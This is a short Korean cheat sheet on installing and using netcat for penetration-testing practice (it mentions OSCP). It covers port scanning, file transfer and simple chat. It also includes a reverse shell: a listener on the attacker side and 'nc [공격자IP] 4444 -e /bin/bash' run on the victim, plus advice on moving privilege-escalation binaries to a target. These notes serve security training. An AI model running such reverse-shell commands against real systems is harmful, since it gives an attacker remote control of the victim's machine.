# Netcat 설치 및 실전 사용법

- netcat(nc) — 포트 스캔, 리버스 셸 리스너(nc -lvnp 4444), 파일 전송(< / >), 간이 채팅까지 하는 TCP/UDP 연결 도구.
- 리버스 셸을 받을 리스너를 띄울 때, 권한 상승용 바이너리를 타깃으로 전송할 때, 특정 포트 응답을 수동 확인할 때.
- netcat-traditional(-e 옵션 지원, 리버스 셸에 유리) 또는 ncat 설치가 필요하고, 암호화가 필요한 수신에는 ncat --ssl을 쓴다.

## 설치

```bash
sudo apt update
sudo apt install netcat-traditional -y
```

- `netcat-openbsd`: 최신 옵션(-e 등 일부 제한), 대부분의 리눅스에서 기본 추천
- `netcat-traditional`: 구버전, -e 옵션 지원(리버스 쉘에 유리)
- 실전에서는 둘 중 하나를 명확히 선택해서 설치해야 함
  - 리버스 쉘 등 OSCP 실습에선 `netcat-traditional`이 더 직관적임
  - 설치 오류 시 위 명령어 중 하나를 선택해서 진행

## 주요 사용법

### 1. 포트 스캔

```bash
nc -vn [타겟IP] [포트번호]
nc -vn 10.10.10.10 8080
```

- `-v`(verbose), `-n`(숫자 IP)

### 2. 리버스 쉘 연결

#### 리스너(공격자)

```bash
nc -lvnp 4444
```

#### 타겟(피해자)

```bash
nc [공격자IP] 4444 -e /bin/bash
# 일부 시스템은 -e 옵션이 막혀있을 수 있음
```

- 리버스 쉘 획득 시 가장 직관적으로 사용

### 3. 파일 전송

#### 송신

```bash
nc [타겟IP] 4444 < 파일명
```

#### 수신

```bash
nc -lvnp 4444 > 파일명
ncat --ssl -lvnp 4444
# --ssl: option enables SSL encryption for the listener.
```

- 권한 상승 후 바이너리 전송 등 실전에서 자주 활용

### 4. 간단한 채팅

#### 서버

```bash
nc -lvnp 1234
```

#### 클라이언트

```bash
nc [서버IP] 1234
```

- 내부 네트워크에서 통신 테스트에 유용

## 팁

- netcat은 단순하지만 강력함. 실전에서는 리버스 쉘, 파일 전송, 포트 스캔에 가장 많이 사용됨
- `ncat`(nmap 패키지 포함)은 netcat의 대체품으로, 옵션이 더 다양함
